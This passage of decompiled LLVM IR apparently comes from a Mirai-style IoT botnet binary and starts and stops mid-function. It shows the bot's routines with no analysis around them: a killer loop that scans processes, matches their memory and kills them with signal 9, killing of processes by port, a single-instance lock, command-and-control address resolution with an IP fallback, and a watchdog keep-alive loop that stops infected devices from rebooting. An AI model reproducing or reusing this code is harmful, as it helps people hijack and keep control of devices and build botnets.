  br i1 %v2_d4b8, label %dec_label_pc_d4cc, label %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge

dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge:    ; preds = %dec_label_pc_d4a8
  %v0_d4c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge, %dec_label_pc_d49c, %dec_label_pc_d488
  %v0_d4c4 = phi i32 [ %v0_d4c4.pre, %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge ], [ %v0_d49c, %dec_label_pc_d49c ], [ %v1_d490, %dec_label_pc_d488 ]
  store i32 %v2_d358, i32* @r7, align 4
  store i32 %v0_d4c4, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d2a8.backedge:                       ; preds = %dec_label_pc_d30c, %dec_label_pc_d304, %dec_label_pc_d2b8, %dec_label_pc_d4c0, %dec_label_pc_d61c, %.thread10
  %stack_var_-8484.1.be = phi i32 [ %v1_d2dc, %dec_label_pc_d61c ], [ %v1_d2dc, %dec_label_pc_d4c0 ], [ %v1_d2dc, %.thread10 ], [ %stack_var_-8484.2, %dec_label_pc_d2b8 ], [ %v1_d2dc, %dec_label_pc_d304 ], [ %v1_d2dc, %dec_label_pc_d30c ]
  %v0_d2a8 = load i32, i32* @fp, align 4
  %v1_d2ac = inttoptr i32 %v0_d2a8 to i32*
  %v2_d2ac = call i32 @__GI_readdir(i32* %v1_d2ac)
  %v2_d2b0 = icmp eq i32 %v2_d2ac, 0
  br i1 %v2_d2b0, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4a8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d4d4 = call i32 @__libc_open(i32 %v1_cfb8, i32* null)
  %v7_d4d8 = icmp eq i32 %v3_d4d4, -1
  store i32 %v3_d4d4, i32* @r4, align 4
  br i1 %v7_d4d8, label %bb140, label %.thread12

bb140:                                            ; preds = %dec_label_pc_d4cc
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d4cc, %bb140
  store i32 ptrtoint (i32* @global_var_d4ec.80 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d4d8, i32 ptrtoint (i32* @global_var_11190.79 to i32))
  %v0_d4ec = load i32, i32* @r4, align 4
  %v1_d4f0 = call i32 @__GI___libc_close(i32 %v0_d4ec)
  br label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d354, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d4fc = call i32 @__libc_open(i32 %v2_d380, i32* null)
  %v7_d500 = icmp eq i32 %v3_d4fc, -1
  store i32 %v3_d4fc, i32* %sl.global-to-local, align 4
  br i1 %v7_d500, label %dec_label_pc_d61c, label %dec_label_pc_d50c

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d4f4
  %v1_d510 = call i32 @table_unlock_val(i32 18)
  %v1_d518 = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d520, i32* %r1.global-to-local, align 4
  %v3_d528 = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v2_d52c, i32* %r1.global-to-local, align 4
  store i32 %v3_d528, i32* @r6, align 4
  %v3_d538 = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d538, i32* @r7, align 4
  store i32 %v2_d544, i32* @r4, align 4
  %v0_d54856 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d55457 = call i32 @__libc_read(i32 %v0_d54856)
  %tmp141 = icmp slt i32 %v1_d55457, 1
  br i1 %tmp141, label %dec_label_pc_d690, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d50c, %dec_label_pc_d548.backedge
  %v0_d59447 = phi i32 [ %v1_d554, %dec_label_pc_d548.backedge ], [ %v1_d55457, %dec_label_pc_d50c ]
  %v3_d564 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d564, i32* @r5, align 4
  %v5_d56c = icmp slt i32 %v0_d59447, %v3_d564
  br i1 %v5_d56c, label %dec_label_pc_d57c, label %dec_label_pc_d5d0.lr.ph

dec_label_pc_d5d0.lr.ph:                          ; preds = %dec_label_pc_d560
  %v1_d5c839 = add i32 %v0_d59447, -1
  store i32 %v1_d5c839, i32* %r1.global-to-local, align 4
  %v0_d5d0.pre = load i32, i32* @r6, align 4
  %v1_d5d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d560
  store i32 %v2_d110, i32* %r1.global-to-local, align 4
  %v3_d580 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d580, i32* @lr, align 4
  %v5_d588 = icmp slt i32 %v0_d59447, %v3_d580
  br i1 %v5_d588, label %dec_label_pc_d548.backedge, label %.thread25

dec_label_pc_d548.backedge:                       ; preds = %dec_label_pc_d5b0, %.thread25, %dec_label_pc_d57c
  %v0_d548 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d554 = call i32 @__libc_read(i32 %v0_d548)
  %tmp142 = icmp slt i32 %v1_d554, 1
  br i1 %tmp142, label %dec_label_pc_d690, label %dec_label_pc_d560

.thread25:                                        ; preds = %dec_label_pc_d57c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d59449 = icmp eq i32 %v0_d59447, 0
  br i1 %v2_d59449, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c.lr.ph

dec_label_pc_d59c.lr.ph:                          ; preds = %.thread25
  %v0_d59c.pre = load i32, i32* @r7, align 4
  %v1_d5a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d59c

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d5b0, %dec_label_pc_d59c.lr.ph
  %v0_d594.in = phi i32 [ %v0_d59447, %dec_label_pc_d59c.lr.ph ], [ %v0_d594, %dec_label_pc_d5b0 ]
  %v0_d5b0 = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d5b0, %dec_label_pc_d5b0 ]
  %v1_d59c = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d59c86, %dec_label_pc_d5b0 ]
  %v0_d594 = add i32 %v0_d594.in, -1
  %v2_d59c = add i32 %v1_d59c, %v0_d59c.pre
  %v3_d59c = inttoptr i32 %v2_d59c to i8*
  %v4_d59c = load i8, i8* %v3_d59c, align 1
  %v6_d59c = zext i8 %v4_d59c to i32
  store i32 %v6_d59c, i32* %r2.global-to-local, align 4
  %v2_d5a0 = add i32 %v0_d5b0, %v1_d5a0.pre
  %v3_d5a0 = inttoptr i32 %v2_d5a0 to i8*
  %v4_d5a0 = load i8, i8* %v3_d5a0, align 1
  %v6_d5a0 = zext i8 %v4_d5a0 to i32
  store i32 %v6_d5a0, i32* @r3, align 4
  %v9_d5a4 = icmp eq i8 %v4_d5a0, %v4_d59c
  br i1 %v9_d5a4, label %dec_label_pc_d5ec, label %bb143

bb143:                                            ; preds = %dec_label_pc_d59c
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %bb143, %dec_label_pc_d5ec
  %v1_d59c86 = phi i32 [ %v1_d5ec, %dec_label_pc_d5ec ], [ 0, %bb143 ]
  %v1_d5b0 = add i32 %v0_d5b0, 1
  store i32 %v1_d5b0, i32* %r1.global-to-local, align 4
  %v2_d594 = icmp eq i32 %v0_d594, 0
  br i1 %v2_d594, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5d0
  %v1_d5b8 = add i32 %v1_d5d0, 1
  store i32 %v1_d5b8, i32* @lr, align 4
  %v9_d5bc = icmp eq i32 %v3_d564, %v1_d5b8
  br i1 %v9_d5bc, label %dec_label_pc_d5f8, label %dec_label_pc_d5c8.backedge

dec_label_pc_d5c8.backedge:                       ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5e4
  %v1_d5d077 = phi i32 [ 0, %dec_label_pc_d5e4 ], [ %v1_d5b8, %dec_label_pc_d5b8 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d5c8 = add i32 %v0_d5c8, -1
  store i32 %v1_d5c8, i32* %r1.global-to-local, align 4
  %v2_d5c8 = icmp eq i32 %v0_d5c8, 0
  br i1 %v2_d5c8, label %dec_label_pc_d57c, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d5d0.lr.ph
  %v0_d5c8 = phi i32 [ %v1_d5c839, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5c8, %dec_label_pc_d5c8.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %storemerge, %dec_label_pc_d5c8.backedge ]
  %v1_d5d0 = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5d077, %dec_label_pc_d5c8.backedge ]
  %v2_d5d0 = add i32 %v1_d5d0, %v0_d5d0.pre
  %v3_d5d0 = inttoptr i32 %v2_d5d0 to i8*
  %v4_d5d0 = load i8, i8* %v3_d5d0, align 1
  %v6_d5d0 = zext i8 %v4_d5d0 to i32
  store i32 %v6_d5d0, i32* %r2.global-to-local, align 4
  %v2_d5d4 = add i32 %storemerge.in, %v1_d5d4.pre
  %v3_d5d4 = inttoptr i32 %v2_d5d4 to i8*
  %v4_d5d4 = load i8, i8* %v3_d5d4, align 1
  %v6_d5d4 = zext i8 %v4_d5d4 to i32
  store i32 %v6_d5d4, i32* @r3, align 4
  %v9_d5d8 = icmp eq i8 %v4_d5d4, %v4_d5d0
  br i1 %v9_d5d8, label %dec_label_pc_d5b8, label %dec_label_pc_d5e4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d0
  br label %dec_label_pc_d5c8.backedge

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d59c
  %v1_d5ec = add i32 %v1_d59c, 1
  %v9_d5f0 = icmp eq i32 %v3_d580, %v1_d5ec
  br i1 %v9_d5f0, label %dec_label_pc_d5f8, label %dec_label_pc_d5b0

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5ec
  %v1_d5fc = call i32 @table_lock_val(i32 18)
  %v1_d604 = call i32 @table_lock_val(i32 19)
  %v0_d608 = load i32, i32* %sl.global-to-local, align 4
  %v1_d60c = call i32 @__GI___libc_close(i32 %v0_d608)
  %v0_d610 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d618 = call i32 @kill(i32 %v0_d610, i32 9)
  br label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d690, %dec_label_pc_d5f8
  store i32 %v2_d380, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d624 = call i32 @util_zero()
  store i32 %v2_d3d0, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d634 = call i32 @util_zero()
  %v1_d63c = call i32 @sleep(i32 1)
  store i32 %v2_d358, i32* @r7, align 4
  %v0_d644 = load i32, i32* @r8, align 4
  store i32 %v0_d644, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d184
  %v1_d654 = call i32 @killer_kill_by_port(i32 42448)
  %v2_d658 = icmp eq i32 %v1_d654, 0
  br i1 %v2_d658, label %dec_label_pc_d660, label %dec_label_pc_d194

dec_label_pc_d660:                                ; preds = %dec_label_pc_d64c
  %v1_d664 = call i32 @killer_kill_by_port(i32 20480)
  %v2_d668 = icmp eq i32 %v1_d664, 0
  br i1 %v2_d668, label %dec_label_pc_d670, label %dec_label_pc_d194

dec_label_pc_d670:                                ; preds = %dec_label_pc_d660
  %v1_d678 = call i32 @killer_kill_by_port(i32 34254)
  %v2_d67c = icmp eq i32 %v1_d678, 0
  br i1 %v2_d67c, label %dec_label_pc_d684, label %dec_label_pc_d194

dec_label_pc_d684:                                ; preds = %dec_label_pc_d670
  %v0_d684 = load i32, i32* @r5, align 4
  %v1_d688 = call i32 @killer_kill_by_port(i32 %v0_d684)
  br label %dec_label_pc_d194

dec_label_pc_d690:                                ; preds = %dec_label_pc_d548.backedge, %dec_label_pc_d50c
  %v1_d694 = call i32 @table_lock_val(i32 18)
  %v1_d69c = call i32 @table_lock_val(i32 19)
  %v0_d6a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_d6a4 = call i32 @__GI___libc_close(i32 %v0_d6a0)
  br label %dec_label_pc_d61c

; uselistorder directives
  uselistorder i32 %v1_d5ec, { 1, 0 }
  uselistorder i32 %v1_d5b0, { 1, 0 }
  uselistorder i32 %v1_d59c, { 1, 0 }
  uselistorder i32 %v0_d5b0, { 1, 0 }
  uselistorder i32 %v1_d554, { 1, 0 }
  uselistorder i32 %v3_d4fc, { 1, 0 }
  uselistorder i1 %v7_d4d8, { 1, 0 }
  uselistorder i32 %v3_d4d4, { 1, 0 }
  uselistorder i32 %v2_d2ac, { 1, 0 }
  uselistorder i32 %stack_var_-8484.1.be, { 1, 0 }
  uselistorder i32 %v3_d42c, { 1, 2, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v1_d2dc, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7 }
  uselistorder i32 %v1_d2b8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d27c, { 1, 2, 0 }
  uselistorder i32 %v3_d244, { 1, 2, 0 }
  uselistorder i32 %v3_d210, { 1, 2, 0 }
  uselistorder i32 %v3_d1d8, { 1, 2, 0 }
  uselistorder i32 %v3_d1a0, { 2, 1, 0 }
  uselistorder i32 %v3_d158, { 1, 2, 0 }
  uselistorder i32 %stack_var_-8484.0, { 1, 0 }
  uselistorder i32 %v2_d544, { 1, 0, 2 }
  uselistorder i32 %v2_d3d0, { 1, 0, 2 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v3_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 0, 4, 53, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 20480, { 0, 2, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24d50.74, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d61c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
  uselistorder label %dec_label_pc_d5c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_d560, { 1, 0 }
  uselistorder label %dec_label_pc_d4f4, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d2a8.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d488, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d270, { 1, 0 }
  uselistorder label %dec_label_pc_d238, { 1, 0 }
  uselistorder label %dec_label_pc_d204, { 1, 0 }
  uselistorder label %dec_label_pc_d1cc, { 1, 0 }
  uselistorder label %dec_label_pc_d194, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d184, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d834.82 to i32), i32* @global_var_220c0.84, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d6d4 = load i32, i32* @r6, align 4
  %v12_d6d4 = load i32, i32* @r7, align 4
  %v15_d6d4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6f0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_220b8.86 to i32), i32* @r6, align 4
  %v7_d6f8 = icmp eq i32 %v3_d6f0, -1
  store i32 %v3_d6f0, i32* @global_var_220b8.86, align 4
  br i1 %v7_d6f8, label %dec_label_pc_d7b0, label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %entry
  %v2_d704 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d704, i32* @r3, align 4
  %v0_d708 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d718 = call i32 @__GI_setsockopt(i32 %v3_d6f0, i32 %v0_d708, i32 2, i32 %v2_d704, i32 4)
  %v2_d71c = load i32, i32* @global_var_220b8.86, align 4
  store i32 %v2_d71c, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d72c = call i32 @__libc_fcntl(i32 %v2_d71c, i32 3)
  %v0_d730 = load i32, i32* @r5, align 4
  %v1_d734 = or i32 %v2_d72c, 2048
  store i32 %v1_d734, i32* @r2, align 4
  %v0_d738 = load i32, i32* @r4, align 4
  %v2_d73c = call i32 @__libc_fcntl(i32 %v0_d738, i32 %v0_d730)
  store i32 ptrtoint (i8** @global_var_220c4.88 to i32), i32* @r8, align 4
  %v2_d744 = load i8, i8* bitcast (i8** @global_var_220c4.88 to i8*), align 4
  %v2_d748 = icmp eq i8 %v2_d744, 0
  br i1 %v2_d748, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d704
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d704
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d76c = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d774 = inttoptr i32 %v0_d76c to i32*
  store i32 0, i32* %v2_d774, align 4
  %v2_d778 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d778, i32* @r5, align 4
  store i32 %v0_d76c, i32* %r4.global-to-local, align 4
  %v2_d788 = load i32, i32* @global_var_220b8.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d794 = call i32 @bind(i32 %v2_d788, i32 %v2_d778, i32 16)
  %v7_d798 = icmp eq i32 %v3_d794, -1
  br i1 %v7_d798, label %dec_label_pc_d7bc, label %dec_label_pc_d7a0

dec_label_pc_d7a0:                                ; preds = %bb20
  %v2_d7a8 = load i32, i32* @global_var_220b8.86, align 4
  %v2_d7ac = call i32 @listen(i32 %v2_d7a8, i32 1)
  br label %dec_label_pc_d7b0

dec_label_pc_d7b0:                                ; preds = %entry, %dec_label_pc_d7c8, %dec_label_pc_d7a0
  %v1_d7b8 = phi i32 [ %v3_d6f0, %entry ], [ %v1_d80c, %dec_label_pc_d7c8 ], [ %v2_d7ac, %dec_label_pc_d7a0 ]
  store i32 %v9_d6d4, i32* @r6, align 4
  store i32 %v12_d6d4, i32* @r7, align 4
  store i32 %v15_d6d4, i32* @r8, align 4
  ret i32 %v1_d7b8

dec_label_pc_d7bc:                                ; preds = %bb20
  %v0_d7bc = load i32, i32* %r4.global-to-local, align 4
  %v1_d7bc = inttoptr i32 %v0_d7bc to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  %v7_d7c0 = icmp eq i32 %v2_d7bc, 99
  br i1 %v7_d7c0, label %dec_label_pc_d814, label %dec_label_pc_d7c8

dec_label_pc_d7c8:                                ; preds = %dec_label_pc_d814, %bb21, %dec_label_pc_d7bc
  store i32 9510, i32* @r4, align 4
  %v2_d7e0 = load i32, i32* @global_var_220b8.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7f0 = call i32 @__libc_connect(i32 %v2_d7e0, i32 %v2_d778, i32 16)
  %v1_d7f8 = call i32 @sleep(i32 5)
  %v2_d7fc = load i32, i32* @global_var_220b8.86, align 4
  %v1_d800 = call i32 @__GI___libc_close(i32 %v2_d7fc)
  %v0_d804 = load i32, i32* @r4, align 4
  %v1_d808 = call i32 @killer_kill_by_port(i32 %v0_d804)
  %v1_d80c = call i32 @ensure_single_instance(i32 %v1_d808)
  br label %dec_label_pc_d7b0

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7bc
  %v2_d814 = load i8, i8* bitcast (i8** @global_var_220c4.88 to i8*), align 4
  %v3_d814 = zext i8 %v2_d814 to i32
  %v1_d818 = load i32, i32* @r7, align 4
  %v9_d818 = icmp eq i32 %v3_d814, %v1_d818
  br i1 %v9_d818, label %dec_label_pc_d7c8, label %bb21

bb21:                                             ; preds = %dec_label_pc_d814
  %v2_d820 = trunc i32 %v1_d818 to i8
  store i8 %v2_d820, i8* bitcast (i8** @global_var_220c4.88 to i8*), align 4
  br label %dec_label_pc_d7c8

; uselistorder directives
  uselistorder i32 %v2_d778, { 1, 0, 2 }
  uselistorder i32 %v3_d6f0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_220c4.88 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_220c4.88, { 1, 0 }
  uselistorder label %dec_label_pc_d7c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7b0, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr() local_unnamed_addr {
entry:
  %v2_d83c = call i32 @resolv_lookup(i32 ptrtoint ([22 x i8]* @global_var_196ec.91 to i32))
  store i32 %v2_d83c, i32* @r6, align 4
  %v3_d840 = icmp eq i32 %v2_d83c, 0
  br i1 %v3_d840, label %dec_label_pc_d898, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %entry
  %v1_d848 = add i32 %v2_d83c, 4
  %v2_d848 = inttoptr i32 %v1_d848 to i32*
  %v3_d848 = load i32, i32* %v2_d848, align 4
  store i32 %v3_d848, i32* @r4, align 4
  %v0_d84c = call i32 @rand_next()
  %v0_d850 = load i32, i32* @r6, align 4
  %v1_d850 = inttoptr i32 %v0_d850 to i8*
  %v2_d850 = load i8, i8* %v1_d850, align 1
  %v3_d850 = zext i8 %v2_d850 to i32
  %v3_d854 = urem i32 %v0_d84c, %v3_d850
  store i32 ptrtoint (i16** @global_var_24d58.93 to i32), i32* @r5, align 4
  %v0_d85c = load i32, i32* @r4, align 4
  %v4_d85c = mul nuw nsw i32 %v3_d854, 4
  %v5_d85c = add i32 %v0_d85c, %v4_d85c
  %v6_d85c = inttoptr i32 %v5_d85c to i32*
  %v7_d85c = load i32, i32* %v6_d85c, align 4
  store i32 %v7_d85c, i32* @global_var_24d5c.94, align 4
  %v2_d868 = call i32 @resolv_entries_free(i32 %v0_d850, i32 %v3_d854)
  %v1_d870 = call i32 @table_unlock_val(i32 1)
  %v3_d87c = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d87c = inttoptr i32 %v3_d87c to i16*
  %v3_d880 = load i16, i16* %v4_d87c, align 2
  store i16 %v3_d880, i16* bitcast (i32* @global_var_24d5a.95 to i16*), align 4
  %v1_d88c = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_d890

dec_label_pc_d890:                                ; preds = %dec_label_pc_d898, %dec_label_pc_d848
  %v1_d894 = phi i32 [ %v2_d89c, %dec_label_pc_d898 ], [ %v1_d88c, %dec_label_pc_d848 ]
  ret i32 %v1_d894

dec_label_pc_d898:                                ; preds = %entry
  store i32 ptrtoint ([15 x i8]* @global_var_19704.97 to i32), i32* @r0, align 4
  %v2_d89c = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_19704.97 to i32))
  store i32 %v2_d89c, i32* @global_var_24d5c.94, align 4
  br label %dec_label_pc_d890

; uselistorder directives
  uselistorder i32 %v2_d89c, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d8b8 = load i32, i32* @r4, align 4
  %v6_d8b8 = load i32, i32* @r5, align 4
  %v9_d8b8 = load i32, i32* @lr, align 4
  %v0_d8c0 = call i32 @__libc_fork()
  %v7_d8c4 = icmp eq i32 %v0_d8c0, -1
  %. = zext i1 %v7_d8c4 to i32
  %tmp11 = icmp slt i32 %v0_d8c0, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d8e0 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d8c0, i32* @global_var_22238.99, align 4
  br i1 %v2_d8e0, label %dec_label_pc_d8f8, label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %entry
  store i32 %v3_d8b8, i32* @r4, align 4
  store i32 %v6_d8b8, i32* @r5, align 4
  store i32 %v9_d8b8, i32* @lr, align 4
  ret i32 %v0_d8c0

dec_label_pc_d8f8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d904 = call i32 @table_unlock_val(i32 23)
  %v1_d90c = call i32 @table_unlock_val(i32 24)
  %v0_d910 = load i32, i32* @r5, align 4
  %v2_d918 = inttoptr i32 %v0_d910 to i32*
  %v3_d918 = call i32 @table_retrieve_val(i32 23, i32* %v2_d918)
  %v3_d920 = call i32 @__libc_open(i32 %v3_d918, i32* inttoptr (i32 2 to i32*))
  %v7_d924 = icmp eq i32 %v3_d920, -1
  store i32 %v3_d920, i32* @r4, align 4
  br i1 %v7_d924, label %dec_label_pc_d96c, label %dec_label_pc_d930

dec_label_pc_d930:                                ; preds = %dec_label_pc_d96c, %dec_label_pc_d8f8
  %v0_d93c = phi i32 [ %v3_d97c, %dec_label_pc_d96c ], [ %v3_d920, %dec_label_pc_d8f8 ]
  %v2_d940 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d944 = call i32 @ioctl(i32 %v0_d93c, i32 -2147199228, i32 %v2_d940)
  br label %dec_label_pc_d948

dec_label_pc_d948:                                ; preds = %dec_label_pc_d948, %dec_label_pc_d930
  %v0_d954 = load i32, i32* @r4, align 4
  %v3_d95c = call i32 @ioctl(i32 %v0_d954, i32 -2147199227, i32 0)
  %v1_d964 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d948

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d8f8
  %v0_d96c = load i32, i32* @r5, align 4
  %v2_d974 = inttoptr i32 %v0_d96c to i32*
  %v3_d974 = call i32 @table_retrieve_val(i32 24, i32* %v2_d974)
  %v3_d97c = call i32 @__libc_open(i32 %v3_d974, i32* inttoptr (i32 2 to i32*))
  %v3_d980 = icmp eq i32 %v3_d97c, -1
  store i32 %v3_d97c, i32* @r4, align 4
  br i1 %v3_d980, label %dec_label_pc_d98c, label %dec_label_pc_d930

dec_label_pc_d98c:                                ; preds = %dec_label_pc_d96c
  %v1_d990 = call i32 @table_lock_val(i32 23)
  %v1_d998 = call i32 @table_lock_val(i32 24)
  %v0_d99c = load i32, i32* @r5, align 4
  %v1_d9a0 = call i32 @__GI_exit(i32 %v0_d99c)
  %v0_d9a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d9a4, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d98c
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d98c, %bb14
  ret i32 %v1_d9a0

; uselistorder directives
  uselistorder i32 %v3_d97c, { 1, 2, 0 }
  uselistorder i32 %v3_d920, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d8c0, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
